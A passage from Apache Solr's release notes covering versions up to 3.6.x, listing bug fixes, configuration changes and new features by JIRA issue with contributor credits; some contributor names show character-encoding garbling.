  12. [SOLR-2275](http://issues.apache.org/jira/browse/SOLR-2275): fix DisMax 'mm' parsing to be tolerant of whitespace

      (Erick Erickson via hossman)
  13. [SOLR-2193](http://issues.apache.org/jira/browse/SOLR-2193), [SOLR-2565](http://issues.apache.org/jira/browse/SOLR-2565), [SOLR-2651](http://issues.apache.org/jira/browse/SOLR-2651): SolrCores now properly share IndexWriters across SolrCore reloads.

      (Mark Miller, Robert Muir)
      Additional Work:
      - [SOLR-2705](http://issues.apache.org/jira/browse/SOLR-2705): On reload, IndexWriterProvider holds onto the initial SolrCore it was created with.

        (Yury Kats, Mark Miller)
  14. [SOLR-2682](http://issues.apache.org/jira/browse/SOLR-2682): Remove addException() in SimpleFacet. FacetComponent no longer catches and embeds
      exceptions occurred during facet processing, it throws HTTP 400 or 500 exceptions instead.

      (koji)
  15. [SOLR-2654](http://issues.apache.org/jira/browse/SOLR-2654): Directorys used by a SolrCore are now closed when they are no longer used.

      (Mark Miller)
  16. [SOLR-2854](http://issues.apache.org/jira/browse/SOLR-2854): Now load URL content stream data (via stream.url) when called for during request handling,
      rather than loading URL content streams automatically regardless of use.

      (David Smiley and Ryan McKinley via ehatcher)
  17. [SOLR-2829](http://issues.apache.org/jira/browse/SOLR-2829): Fix problem with false-positives due to incorrect
      equals methods.

      (Yonik Seeley, Hossman, Erick Erickson.
      Marc Tinnemeyer caught the bug)
  18. [SOLR-2848](http://issues.apache.org/jira/browse/SOLR-2848): Removed 'instanceof AbstractLuceneSpellChecker' hacks from distributed spellchecking code,
      and added a merge() method to SolrSpellChecker instead. Previously if you extended SolrSpellChecker
      your spellchecker would not work in distributed fashion.

      (James Dyer via rmuir)
  19. [SOLR-2509](http://issues.apache.org/jira/browse/SOLR-2509): StringIndexOutOfBoundsException in the spellchecker collate when the term contains
      a hyphen.

      (Thomas Gambier caught the bug, Steffen Godskesen did the patch, via Erick Erickson)
  20. [SOLR-1730](http://issues.apache.org/jira/browse/SOLR-1730): Made it clearer when a core failed to load as well as better logging when the
      QueryElevationComponent fails to properly initialize

      (gsingers)
  21. [SOLR-1520](http://issues.apache.org/jira/browse/SOLR-1520): QueryElevationComponent now supports non-string ids

      (gsingers)
  22. [SOLR-3037](http://issues.apache.org/jira/browse/SOLR-3037): When using binary format in solrj the codec screws up parameters

      (Sami Siren, JÃ¶rg Maier via yonik)
  23. [SOLR-3062](http://issues.apache.org/jira/browse/SOLR-3062): A join in the main query was not respecting any filters pushed
      down to it via acceptDocs since [LUCENE-1536](http://issues.apache.org/jira/browse/LUCENE-1536).

      (Mike Hugo, yonik)
  24. [SOLR-3214](http://issues.apache.org/jira/browse/SOLR-3214): If you use multiple fl entries rather than a comma separated list, all but the first
      entry can be ignored if you are using distributed search.

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via Mark Miller)
  25. [SOLR-3352](http://issues.apache.org/jira/browse/SOLR-3352): eDismax: pf2 should kick in for a query with 2 terms

      (janhoy)
  26. [SOLR-3361](http://issues.apache.org/jira/browse/SOLR-3361): ReplicationHandler "maxNumberOfBackups" doesn't work if backups are triggered on commit

      (James Dyer, TomÃ¡s FernÃ¡ndez LÃ¶bbe)
  27. [SOLR-2605](http://issues.apache.org/jira/browse/SOLR-2605): fixed tracking of the 'defaultCoreName' in CoreContainer so that
      CoreAdminHandler could return consistent information regardless of whether
      there is a a default core name or not.

      (steffkes, hossman)
  28. [SOLR-3370](http://issues.apache.org/jira/browse/SOLR-3370): fixed CSVResponseWriter to respect globs in the 'fl' param

      (Keith Fligg via hossman)
  29. [SOLR-3436](http://issues.apache.org/jira/browse/SOLR-3436): Group count incorrect when not all shards are queried in the second
      pass.

      (Francois Perron, Martijn van Groningen)
  30. [SOLR-3454](http://issues.apache.org/jira/browse/SOLR-3454): Exception when using result grouping with main=true and using
      wt=javabin.

      (Ludovic Boutros, Martijn van Groningen)
  31. [SOLR-3446](http://issues.apache.org/jira/browse/SOLR-3446): Better errors when PatternTokenizerFactory is configured with
      an invalid pattern, and include the 'name' whenever possible in plugin init
      error messages.

      (hossman)
  32. [LUCENE-4075](http://issues.apache.org/jira/browse/LUCENE-4075): Cleaner path usage in TestXPathEntityProcessor

      (Greg Bowyer via hossman)
  33. [SOLR-2923](http://issues.apache.org/jira/browse/SOLR-2923): IllegalArgumentException when using useFilterForSortedQuery on an
      empty index.

      (Adrien Grand via Mark Miller)
  34. [SOLR-2352](http://issues.apache.org/jira/browse/SOLR-2352): Fixed TermVectorComponent so that it will not fail if the fl
      param contains globs or psuedo-fields

      (hossman)
  35. [SOLR-3541](http://issues.apache.org/jira/browse/SOLR-3541): add missing solrj dependencies to binary packages.

      (Thijs Vonk via siren)
  36. [SOLR-3522](http://issues.apache.org/jira/browse/SOLR-3522): fixed parsing of the 'literal()' function

      (hossman)
  37. [SOLR-3548](http://issues.apache.org/jira/browse/SOLR-3548): Fixed a bug in the cachability of queries using the {!join}
      parser or the strdist() function, as well as some minor improvements to
      the hashCode implementation of {!bbox} and {!geofilt} queries.

      (hossman)
  38. [SOLR-3470](http://issues.apache.org/jira/browse/SOLR-3470): contrib/clustering: custom Carrot2 tokenizer and stemmer factories
      are respected now

      (Stanislaw Osinski, Dawid Weiss)
  39. [SOLR-3430](http://issues.apache.org/jira/browse/SOLR-3430): Added a new DIH test against a real SQL database. Fixed problems
      revealed by this new test related to the expanded cache support added to
      3.6/[SOLR-2382](http://issues.apache.org/jira/browse/SOLR-2382)

      (James Dyer)
  40. [SOLR-1958](http://issues.apache.org/jira/browse/SOLR-1958): When using the MailEntityProcessor, import would fail if
      fetchMailsSince was not specified.

      (Max Lynch via James Dyer)
  41. [SOLR-4289](http://issues.apache.org/jira/browse/SOLR-4289): Admin UI - JVM memory bar - dark grey "used" width is too small

      (steffkes, elyograg)
+ Other Changes   (48)
  1. [SOLR-1846](http://issues.apache.org/jira/browse/SOLR-1846): Eliminate support for the abortOnConfigurationError
     option. It has never worked very well, and in recent versions of
     Solr hasn't worked at all.

     (hossman)
  2. [SOLR-1889](http://issues.apache.org/jira/browse/SOLR-1889): The default logic for the 'mm' param of DismaxQParser and
     ExtendedDismaxQParser has been changed to be determined based on the
     effective value of the 'q.op' param

     (hossman)
  3. [SOLR-1946](http://issues.apache.org/jira/browse/SOLR-1946): Misc improvements to the SystemInfoHandler: /admin/system

     (hossman)
  4. [SOLR-2289](http://issues.apache.org/jira/browse/SOLR-2289): Tweak spatial coords for example docs so they are a bit
     more spread out

     (Erick Erickson via hossman)
  5. [SOLR-2288](http://issues.apache.org/jira/browse/SOLR-2288): Small tweaks to eliminate compiler warnings. primarily
     using Generics where applicable in method/object declarations, and
     adding @SuppressWarnings("unchecked") when appropriate

     (hossman)
  6. [SOLR-2375](http://issues.apache.org/jira/browse/SOLR-2375): Suggester Lookup implementations now store trie data
     and load it back on init. This means that large tries don't have to be
     rebuilt on every commit or core reload.

     (ab)
  7. [SOLR-2413](http://issues.apache.org/jira/browse/SOLR-2413): Support for returning multi-valued fields w/o <arr> tag
     in the XMLResponseWriter was removed. XMLResponseWriter only
     no longer work with values less then 2.2

     (ryan)
  8. [SOLR-2423](http://issues.apache.org/jira/browse/SOLR-2423): FieldType argument changed from String to Object
     Conversion from SolrInputDocument > Object > Fieldable is now managed
     by FieldType rather then DocumentBuilder.

     (ryan)
  9. [SOLR-2461](http://issues.apache.org/jira/browse/SOLR-2461): QuerySenderListener and AbstractSolrEventListener are
     now public

     (hossman)
  10. [LUCENE-2995](http://issues.apache.org/jira/browse/LUCENE-2995): Moved some spellchecker and suggest APIs to modules/suggest:
      HighFrequencyDictionary, SortedIterator, TermFreqIterator, and the
      suggester APIs and implementations.

      (rmuir)
  11. [SOLR-2576](http://issues.apache.org/jira/browse/SOLR-2576): Remove deprecated SpellingResult.add(Token, int).

      (James Dyer via rmuir)
  12. [LUCENE-3232](http://issues.apache.org/jira/browse/LUCENE-3232): Moved MutableValue classes to new 'common' module.

      (Chris Male)
  13. [LUCENE-2883](http://issues.apache.org/jira/browse/LUCENE-2883): FunctionQuery, DocValues (and its impls), ValueSource (and its
      impls) and BoostedQuery have been consolidated into the queries module. They
      can now be found at o.a.l.queries.function.
  14. [SOLR-2027](http://issues.apache.org/jira/browse/SOLR-2027): FacetField.getValues() now returns an empty list if there are no
      values, instead of null

      (Chris Male)
  15. [SOLR-1825](http://issues.apache.org/jira/browse/SOLR-1825): SolrQuery.addFacetQuery now enables facets automatically, like
      addFacetField

      (Chris Male)
  16. [SOLR-2663](http://issues.apache.org/jira/browse/SOLR-2663): FieldTypePluginLoader has been refactored out of IndexSchema
      and made public.

      (hossman)
  17. [SOLR-2331](http://issues.apache.org/jira/browse/SOLR-2331),[SOLR-2691](http://issues.apache.org/jira/browse/SOLR-2691): Refactor CoreContainer's SolrXML serialization code and improve testing

      (Yury Kats, hossman, Mark Miller)
  18. [SOLR-2698](http://issues.apache.org/jira/browse/SOLR-2698): Enhance CoreAdmin STATUS command to return index size.

      (Yury Kats, hossman, Mark Miller)
  19. [SOLR-2654](http://issues.apache.org/jira/browse/SOLR-2654): The same Directory instance is now always used across a SolrCore so that
      it's easier to add other DirectoryFactory's without static caching hacks.

      (Mark Miller)
  20. [LUCENE-3286](http://issues.apache.org/jira/browse/LUCENE-3286): 'luke' ant target has been disabled due to incompatibilities with XML
      queryparser location

      (Chris Male)
  21. [SOLR-1897](http://issues.apache.org/jira/browse/SOLR-1897): The data dir from the core descriptor should override the data dir from
      the solrconfig.xml rather than the other way round.

      (Mark Miller)
  22. [SOLR-2756](http://issues.apache.org/jira/browse/SOLR-2756): Maven configuration: Excluded transitive stax:stax-api dependency
      from org.codehaus.woodstox:wstx-asl dependency.

      (David Smiley via Steve Rowe)
  23. [SOLR-2588](http://issues.apache.org/jira/browse/SOLR-2588): Moved VelocityResponseWriter back to contrib module in order to
      remove it as a mandatory core dependency.

      (ehatcher)
  24. [SOLR-2862](http://issues.apache.org/jira/browse/SOLR-2862): More explicit lexical resources location logged if Carrot2 clustering
      extension is used. Fixed solr. impl. of IResource and IResourceLookup.

      (Dawid Weiss)
  25. [SOLR-1123](http://issues.apache.org/jira/browse/SOLR-1123): Changed JSONResponseWriter to now use application/json as its Content-Type
      by default. However the Content-Type can be overwritten and is set to text/plain in
      the example configuration.

      (Uri Boness, Chris Male)
  26. [SOLR-2607](http://issues.apache.org/jira/browse/SOLR-2607): Removed deprecated client/ruby directory, which included solr-ruby and flare.

      (ehatcher)
  27. [SOLR-3032](http://issues.apache.org/jira/browse/SOLR-3032): logOnce from SolrException logOnce and all the supporting
      structure is gone. abortOnConfigurationError is also gone as it is no longer referenced.
      Errors should be caught and logged at the top-most level or logged and NOT propagated up the
      chain.

      (Erick Erickson)
  28. [SOLR-2105](http://issues.apache.org/jira/browse/SOLR-2105): Remove support for deprecated "update.processor" (since 3.2), in favor of
      "update.chain"

      (janhoy)
  29. [SOLR-3005](http://issues.apache.org/jira/browse/SOLR-3005): Default QueryResponseWriters are now initialized via init() with an empty
      NamedList.

      (Gasol Wu, Chris Male)
  30. [SOLR-2607](http://issues.apache.org/jira/browse/SOLR-2607): Removed obsolete client/ folder

      (ehatcher, Eric Pugh, janhoy)
  31. [SOLR-3202](http://issues.apache.org/jira/browse/SOLR-3202), [SOLR-3244](http://issues.apache.org/jira/browse/SOLR-3244): Dropping Support for JSP. New Admin UI is all client side

      (ryan, Aliaksandr Zhuhrou, Uwe Schindler)
  32. [SOLR-3159](http://issues.apache.org/jira/browse/SOLR-3159): Upgrade example and tests to run with Jetty 8

      (ryan)
  33. [SOLR-3254](http://issues.apache.org/jira/browse/SOLR-3254): Upgrade Solr to Tika 1.1

      (janhoy)
  34. [SOLR-3329](http://issues.apache.org/jira/browse/SOLR-3329): Dropped getSourceID() from SolrInfoMBean and using
      getClass().getPackage().getSpecificationVersion() for Version.

      (ryan)
  35. [SOLR-3302](http://issues.apache.org/jira/browse/SOLR-3302): Upgraded SLF4j to version 1.6.4

      (hossman)
  36. [SOLR-3322](http://issues.apache.org/jira/browse/SOLR-3322): Add more context to IndexReaderFactory.newReader

      (ab)
  37. [SOLR-3343](http://issues.apache.org/jira/browse/SOLR-3343): Moved FastWriter, FileUtils, RegexFileFilter, RTimer and SystemIdResolver
      from org.apache.solr.common to org.apache.solr.util

      (Chris Male)
  38. [SOLR-3357](http://issues.apache.org/jira/browse/SOLR-3357): ResourceLoader.newInstance now accepts a Class representation of the expected
      instance type

      (Chris Male)
  39. [SOLR-3388](http://issues.apache.org/jira/browse/SOLR-3388): HTTP caching is now disabled by default for RequestUpdateHandlers.

      (ryan)
  40. [SOLR-3309](http://issues.apache.org/jira/browse/SOLR-3309): web.xml now specifies metadata-complete=true (which requires
      Servlet 2.5) to prevent servlet containers from scanning class annotations
      on startup. This allows for faster startup times on some servlet containers.

      (Bill Bell, hossman)
  41. [SOLR-1893](http://issues.apache.org/jira/browse/SOLR-1893): Refactored some common code from LRUCache and FastLRUCache into
      SolrCacheBase

      (TomÃ¡s FernÃ¡ndez LÃ¶bbe via hossman)
  42. [SOLR-3403](http://issues.apache.org/jira/browse/SOLR-3403): Deprecated Analysis Factories now log their own deprecation messages.
      No logging support is provided by Factory parent classes.

      (Chris Male)
  43. [SOLR-1258](http://issues.apache.org/jira/browse/SOLR-1258): PingRequestHandler is now directly configured with a
      "healthcheckFile" instead of looking for the legacy
      <admin><healthcheck/></admin> syntax. Filenames specified as relative
      paths have been fixed so that they are resolved against the data dir
      instead of the CWD of the java process.

      (hossman)
  44. [SOLR-3083](http://issues.apache.org/jira/browse/SOLR-3083): JMX beans now report Numbers as numeric values rather then String

      (Tagged Siteops, Greg Bowyer via ryan)
  45. [SOLR-2796](http://issues.apache.org/jira/browse/SOLR-2796): Due to low level changes to support SolrCloud, the uniqueKey
      field can no longer be populated via <copyField/> or <field default=...>
      in the schema.xml.
  46. [SOLR-3534](http://issues.apache.org/jira/browse/SOLR-3534): The Dismax and eDismax query parsers will fall back on the 'df' parameter
      when 'qf' is absent. And if neither is present nor the schema default search field
      then an exception will be thrown now.

      (dsmiley)
  47. [SOLR-3262](http://issues.apache.org/jira/browse/SOLR-3262): The "threads" feature of DIH is removed (deprecated in Solr 3.6)

      (James Dyer)
  48. [SOLR-3422](http://issues.apache.org/jira/browse/SOLR-3422): Refactored DIH internal data classes. All entities in
      data-config.xml must have a name

      (James Dyer)
+ Documentation   (1)
  1. [SOLR-2232](http://issues.apache.org/jira/browse/SOLR-2232): Improved README info on solr.solr.home in examples

     (Eric Pugh and hossman)

### Release 3.6.2 [2012-12-25]

+ Bug Fixes   (2)
  1. [SOLR-3790](http://issues.apache.org/jira/browse/SOLR-3790): ConcurrentModificationException could be thrown when using hl.fl=\*.

     (yonik, koji)
  2. [SOLR-3589](http://issues.apache.org/jira/browse/SOLR-3589): Edismax parser does not honor mm parameter if analyzer splits a token.

     (Tom Burton-West, Robert Muir)

### Release 3.6.1 [2012-07-22]

+ More information about this release, including any errata related to the
  release notes, upgrade instructions, or other changes may be found online at:
  <https://wiki.apache.org/solr/Solr3.6.1>
+ Bug Fixes   (11)
  1. [LUCENE-3969](http://issues.apache.org/jira/browse/LUCENE-3969): Throw IAE on bad arguments that could cause confusing errors in
     PatternTokenizer. CommonGrams populates PositionLengthAttribute correctly.

     (Uwe Schindler, Mike McCandless, Robert Muir)
  2. [SOLR-3361](http://issues.apache.org/jira/browse/SOLR-3361): ReplicationHandler "maxNumberOfBackups" doesn't work if backups are triggered on commit

     (James Dyer, TomÃ¡s FernÃ¡ndez LÃ¶bbe)
  3. [SOLR-3375](http://issues.apache.org/jira/browse/SOLR-3375): Fix charset problems with HttpSolrServer

     (Roger HÃ¥kansson, yonik, siren)
  4. [SOLR-3436](http://issues.apache.org/jira/browse/SOLR-3436): Group count incorrect when not all shards are queried in the second
     pass.

     (Francois Perron, Martijn van Groningen)
  5. [SOLR-3454](http://issues.apache.org/jira/browse/SOLR-3454): Exception when using result grouping with main=true and using
     wt=javabin.

     (Ludovic Boutros, Martijn van Groningen)
  6. [SOLR-3489](http://issues.apache.org/jira/browse/SOLR-3489): Config file replication less error prone

     (Jochen Just via janhoy)
  7. [SOLR-3477](http://issues.apache.org/jira/browse/SOLR-3477): SOLR does not start up when no cores are defined

     (TomÃ¡s FernÃ¡ndez LÃ¶bbe via tommaso)
  8. [SOLR-3470](http://issues.apache.org/jira/browse/SOLR-3470): contrib/clustering: custom Carrot2 tokenizer and stemmer factories
     are respected now

     (Stanislaw Osinski, Dawid Weiss)
  9. [SOLR-3360](http://issues.apache.org/jira/browse/SOLR-3360): More DIH bug fixes for the deprecated "threads" parameter.

     (Mikhail Khludnev, Claudio R, via James Dyer)
  10. [SOLR-3430](http://issues.apache.org/jira/browse/SOLR-3430): Added a new DIH test against a real SQL database. Fixed problems
      revealed by this new test related to the expanded cache support added to
      3.6/[SOLR-2382](http://issues.apache.org/jira/browse/SOLR-2382)

      (James Dyer)
  11. [SOLR-3336](http://issues.apache.org/jira/browse/SOLR-3336): SolrEntityProcessor substitutes most variables at query time.

      (Michael Kroh, Lance Norskog, via Martijn van Groningen)

### Release 3.6.0 [2012-04-12]

+ More information about this release, including any errata related to the
  release notes, upgrade instructions, or other changes may be found online at:
  <https://wiki.apache.org/solr/Solr3.6>
+ Upgrading from Solr 3.5   (9)
  1. [SOLR-2983](http://issues.apache.org/jira/browse/SOLR-2983): As a consequence of moving the code which sets a MergePolicy from SolrIndexWriter to SolrIndexConfig,
     (custom) MergePolicies should now have an empty constructor; thus an IndexWriter should not be passed as constructor
     parameter but instead set using the setIndexWriter() method.
  2. As doGet() methods in SimplePostTool was changed to static, the client applications of this
     class need to be recompiled.
  3. In Solr version 3.5 and earlier, HTMLStripCharFilter had known bugs in the
     character offsets it provided, triggering e.g. exceptions in highlighting.
     HTMLStripCharFilter has been re-implemented, addressing this and other
     issues. See the entry for [LUCENE-3690](http://issues.apache.org/jira/browse/LUCENE-3690) in the Bug Fixes section below for a
     detailed list of changes. For people who depend on the behavior of
     HTMLStripCharFilter in Solr version 3.5 and earlier: the old implementation
     (bugs and all) is preserved as LegacyHTMLStripCharFilter.
  4. As of Solr 3.6, the <indexDefaults> and <mainIndex> sections of solrconfig.xml are deprecated
     and replaced with a new <indexConfig> section. Read more in [SOLR-1052](http://issues.apache.org/jira/browse/SOLR-1052) below.
  5. [SOLR-3040](http://issues.apache.org/jira/browse/SOLR-3040): The DIH's admin UI (dataimport.jsp) now requires DIH request handlers to start with
     a '/'.

     (dsmiley)
  6. [SOLR-3161](http://issues.apache.org/jira/browse/SOLR-3161): <requestDispatcher handleSelect="false"> is now the default. An existing config will
     probably work as-is because handleSelect was explicitly enabled in default configs. HandleSelect
     makes /select work as well as enables the 'qt' parameter. Instead, consider explicitly
     configuring /select as is done in the example solrconfig.xml, and register your other search
     handlers with a leading '/' which is a recommended practice.

     (David Smiley, Erik Hatcher)
  7. [SOLR-3161](http://issues.apache.org/jira/browse/SOLR-3161): Don't use the 'qt' parameter with a leading '/'. It probably won't work in 4.0
     and it's now limited in 3.6 to SearchHandler subclasses that aren't lazy-loaded.
  8. [SOLR-2724](http://issues.apache.org/jira/browse/SOLR-2724): Specifying <defaultSearchField> and <solrQueryParser defaultOperator="..."/> in
     schema.xml is now considered deprecated. Instead you are encouraged to specify these via the "df"
     and "q.op" parameters in your request handler definition.

     (David Smiley)
  9. Bugs found and fixed in the SignatureUpdateProcessor that previously caused
     some documents to produce the same signature even when the configured fields
     contained distinct (non-String) values. Users of SignatureUpdateProcessor
     are strongly advised that they should re-index as document signatures may
     have now changed. (see [SOLR-3200](http://issues.apache.org/jira/browse/SOLR-3200) & [SOLR-3226](http://issues.apache.org/jira/browse/SOLR-3226) for details)
+ New Features   (31)
  1. [SOLR-2020](http://issues.apache.org/jira/browse/SOLR-2020): Add Java client that uses Apache Http Components http client (4.x).

     (Chantal Ackermann, Ryan McKinley, Yonik Seeley, siren)
  2. [SOLR-2854](http://issues.apache.org/jira/browse/SOLR-2854): Now load URL content stream data (via stream.url) when called for during request handling,
     rather than loading URL content streams automatically regardless of use.

     (David Smiley and Ryan McKinley via ehatcher)
  3. [SOLR-2904](http://issues.apache.org/jira/browse/SOLR-2904): BinaryUpdateRequestHandler should be able to accept multiple update requests from
     a stream

     (shalin)
  4. [SOLR-1565](http://issues.apache.org/jira/browse/SOLR-1565): StreamingUpdateSolrServer supports RequestWriter API and therefore, javabin update
     format

     (shalin)
  5. [SOLR-2438](http://issues.apache.org/jira/browse/SOLR-2438) added MultiTermAwareComponent to the various classes to allow automatic lowercasing
     for multiterm queries (wildcards, regex, prefix, range, etc). You can now optionally specify a
     "multiterm" analyzer in our schema.xml, but Solr should "do the right thing" if you don't
     specify <fieldType="multiterm">

     (Pete Sturge Erick Erickson, Mentoring from Seeley and Muir)
  6. [SOLR-2919](http://issues.apache.org/jira/browse/SOLR-2919): Added support for localized range queries when the analysis chain uses
     CollationKeyFilter or ICUCollationKeyFilter.

     (Michael Sokolov, rmuir)
  7. [SOLR-2982](http://issues.apache.org/jira/browse/SOLR-2982): Added BeiderMorseFilterFactory for Beider-Morse (BMPM) phonetic encoder. Upgrades
     commons-codec to version 1.6

     (Brooke Schreier Ganz, rmuir)
  8. [SOLR-1843](http://issues.apache.org/jira/browse/SOLR-1843): A new "rootName" attribute is now available when
     configuring <jmx/> in solrconfig.xml. If this attribute is set,
     Solr will use it as the root name for all MBeans Solr exposes via
     JMX. The default root name is "solr" followed by the core name.

     (Constantijn Visinescu, hossman)
  9. [SOLR-2906](http://issues.apache.org/jira/browse/SOLR-2906): Added LFU cache options to Solr.

     (Shawn Heisey via Erick Erickson)
  10. [SOLR-3036](http://issues.apache.org/jira/browse/SOLR-3036): Ability to specify overwrite=false on the URL for XML updates.

      (Sami Siren via yonik)
  11. [SOLR-2603](http://issues.apache.org/jira/browse/SOLR-2603): Add the encoding function for alternate fields in highlighting.

      (Massimo Schiavon, koji)
  12. [SOLR-1729](http://issues.apache.org/jira/browse/SOLR-1729): Evaluation of NOW for date math is done only once per request for
      consistency, and is also propagated to shards in distributed search.
      Adding a parameter NOW=<time\_in\_ms> to the request will override the
      current time.

      (Peter Sturge, yonik, Simon Willnauer)
  13. [SOLR-1709](http://issues.apache.org/jira/browse/SOLR-1709): Distributed support for Date and Numeric Range Faceting

      (Peter Sturge, David Smiley, hossman, Simon Willnauer)
  14. [SOLR-3054](http://issues.apache.org/jira/browse/SOLR-3054), [LUCENE-3671](http://issues.apache.org/jira/browse/LUCENE-3671): Add TypeTokenFilterFactory that creates TypeTokenFilter
      that filters tokens based on their TypeAttribute.

      (Tommaso Teofili via
      Uwe Schindler)
  15. [LUCENE-3305](http://issues.apache.org/jira/browse/LUCENE-3305), [SOLR-3056](http://issues.apache.org/jira/browse/SOLR-3056): Added Kuromoji morphological analyzer for Japanese.
      See the 'text\_ja' fieldtype in the example to get started.

      (Christian Moen, Masaru Hasegawa via Robert Muir)
  16. [SOLR-1860](http://issues.apache.org/jira/browse/SOLR-1860): StopFilterFactory, CommonGramsFilterFactory, and
      CommonGramsQueryFilterFactory can optionally read stopwords in Snowball
      format (specify format="snowball").

      (Robert Muir)
  17. [SOLR-3105](http://issues.apache.org/jira/browse/SOLR-3105): ElisionFilterFactory optionally allows the parameter
      ignoreCase (default=false).

      (Robert Muir)
  18. [LUCENE-3714](http://issues.apache.org/jira/browse/LUCENE-3714): Add WFSTLookupFactory, a suggester that uses a weighted FST
      for more fine-grained suggestions.

      (Mike McCandless, Dawid Weiss, Robert Muir)
  19. [SOLR-3143](http://issues.apache.org/jira/browse/SOLR-3143): Add SuggestQueryConverter, a QueryConverter intended for
      auto-suggesters.

      (Robert Muir)
  20. [SOLR-3033](http://issues.apache.org/jira/browse/SOLR-3033): ReplicationHandler's backup command now supports a 'maxNumberOfBackups'
      init param that can be used to delete all but the most recent N backups.

      (Torsten Krah, James Dyer)
  21. [SOLR-2202](http://issues.apache.org/jira/browse/SOLR-2202): Currency FieldType, whith support for currencies and exchange rates

      (Greg Fodor & Andrew Morrison via janhoy, rmuir, Uwe Schindler)
  22. [SOLR-3026](http://issues.apache.org/jira/browse/SOLR-3026): eDismax: Locking down which fields can be explicitly queried (user fields aka uf)

      (janhoy, hossmann, TomÃ¡s FernÃ¡ndez LÃ¶bbe)
  23. [SOLR-2826](http://issues.apache.org/jira/browse/SOLR-2826): URLClassify Update Processor

      (janhoy)
  24. [SOLR-2764](http://issues.apache.org/jira/browse/SOLR-2764): Create a NorwegianLightStemmer and NorwegianMinimalStemmer

      (janhoy)
  25. [SOLR-3221](http://issues.apache.org/jira/browse/SOLR-3221): Added the ability to directly configure aspects of the concurrency
      and thread-pooling used within distributed search in solr. This allows for finer
      grained controlled and can be tuned by end users to target their own specific
      requirements. This builds on the work of the HttpCommComponent and uses the same configuration
      block to configure the thread pool. The default configuration has
      the same behaviour as solr 3.5, favouring throughput over latency. More
      information can be found on the wiki (<http://wiki.apache.org/solr/SolrConfigXml>)

      (Greg Bowyer)
  26. [SOLR-2001](http://issues.apache.org/jira/browse/SOLR-2001): The query component will substitute an empty query that matches
      no documents if the query parser returns null. This also prevents an
      exception from being thrown by the default parser if "q" is missing.

      (yonik)
      - [SOLR-435](http://issues.apache.org/jira/browse/SOLR-435): if q is "" then it's also acceptable.

        (dsmiley, hoss)
  27. [SOLR-2919](http://issues.apache.org/jira/browse/SOLR-2919): Added parametric tailoring options to ICUCollationKeyFilterFactory.
      These can be used to customize range query/sort behavior, for example to
      support numeric collation, ignore punctuation/whitespace, ignore accents but
      not case, control whether upper/lowercase values are sorted first, etc.

      (rmuir)
  28. [SOLR-2346](http://issues.apache.org/jira/browse/SOLR-2346): Add a chance to set content encoding explicitly via content type
      of stream for extracting request handler. This is convenient when Tika's
      auto detector cannot detect encoding, especially the text file is too short
      to detect encoding.

      (koji)
  29. [SOLR-1499](http://issues.apache.org/jira/browse/SOLR-1499): Added SolrEntityProcessor that imports data from another Solr core
      or instance based on a specified query.

      (Lance Norskog, Erik Hatcher, Pulkit Singhal, Ahmet Arslan, Luca Cavanna,
      Martijn van Groningen)
  30. [SOLR-3190](http://issues.apache.org/jira/browse/SOLR-3190): Minor improvements to SolrEntityProcessor. Add more consistency
      between solr parameters and parameters used in SolrEntityProcessor and
      ability to specify a custom HttpClient instance.

      (Luca Cavanna via Martijn van Groningen)
  31. [SOLR-2382](http://issues.apache.org/jira/browse/SOLR-2382): Added pluggable cache support to DIH so that any Entity can be
      made cache-able by adding the "cacheImpl" parameter. Include
      "SortedMapBackedCache" to provide in-memory caching (as previously this was
      the only option when using CachedSqlEntityProcessor). Users can provide
      their own implementations of DIHCache for other caching strategies.
      Deprecate CachedSqlEntityProcessor in favor of specifing "cacheImpl" with
      SqlEntityProcessor. Make SolrWriter implement DIHWriter and allow the
      possibility of pluggable Writers (DIH writing to something other than Solr).

      (James Dyer, Noble Paul)
+ Optimizations   (3)
  1. [SOLR-1931](http://issues.apache.org/jira/browse/SOLR-1931): Speedup for LukeRequestHandler and admin/schema browser. New parameter
     reportDocCount defaults to 'false'. Old behavior still possible by specifying this as 'true'

     (Erick Erickson)
  2. [SOLR-3012](http://issues.apache.org/jira/browse/SOLR-3012): Move System.getProperty("type") in postData() to main() and add type argument so that
     the client applications of SimplePostTool can set content type via method argument.

     (koji)
  3. [SOLR-2888](http://issues.apache.org/jira/browse/SOLR-2888): FSTSuggester refactoring: internal storage is now UTF-8,
     external sorting (on disk) prevents OOMs even with large data sets
     (the bottleneck is now FST construction), code cleanups and API cleanups.

     (Dawid Weiss, Robert Muir)
+ Bug Fixes   (43)
  1. [SOLR-3187](http://issues.apache.org/jira/browse/SOLR-3187) SystemInfoHandler leaks filehandles

     (siren)
  2. [LUCENE-3820](http://issues.apache.org/jira/browse/LUCENE-3820): Fixed invalid position indexes by reimplementing PatternReplaceCharFilter.
     This change also drops real support for boundary characters -- all input is prebuffered
     for pattern matching.

     (Dawid Weiss)
  3. [SOLR-3068](http://issues.apache.org/jira/browse/SOLR-3068): Fixed NPE in ThreadDumpHandler

     (siren)
  4. [SOLR-2912](http://issues.apache.org/jira/browse/SOLR-2912): Fixed File descriptor leak in ShowFileRequestHandler

     (Michael Ryan, shalin)
  5. [SOLR-2819](http://issues.apache.org/jira/browse/SOLR-2819): Improved speed of parsing hex entities in HTMLStripCharFilter

     (Bernhard Berger, hossman)
  6. [SOLR-2509](http://issues.apache.org/jira/browse/SOLR-2509): StringIndexOutOfBoundsException in the spellchecker collate when the term contains
     a hyphen.

     (Thomas Gambier caught the bug, Steffen Godskesen did the patch, via Erick Erickson)
  7. [SOLR-2955](http://issues.apache.org/jira/browse/SOLR-2955): Fixed IllegalStateException when querying with group.sort=score desc in sharded
     environment.

     (Steffen Elberg Godskesen, Martijn van Groningen)
  8. [SOLR-2956](http://issues.apache.org/jira/browse/SOLR-2956): Fixed inconsistencies in the flags (and flag key) reported by
     the LukeRequestHandler

     (hossman)
  9. [SOLR-1730](http://issues.apache.org/jira/browse/SOLR-1730): Made it clearer when a core failed to load as well as better logging when the
     QueryElevationComponent fails to properly initialize

     (gsingers)
  10. [SOLR-1520](http://issues.apache.org/jira/browse/SOLR-1520): QueryElevationComponent now supports non-string ids

      (gsingers)
  11. [SOLR-3024](http://issues.apache.org/jira/browse/SOLR-3024): Fixed JSONTestUtil.matchObj, in previous releases it was not
      respecting the 'delta' arg

      (David Smiley via hossman)
  12. [SOLR-2542](http://issues.apache.org/jira/browse/SOLR-2542): Fixed DIH Context variables which were broken for all scopes other
      then SCOPE\_ENTITY

      (Linbin Chen & Frank Wesemann via hossman)
  13. [SOLR-3042](http://issues.apache.org/jira/browse/SOLR-3042): Fixed Maven Jetty plugin configuration.

      (David Smiley via Steve Rowe)
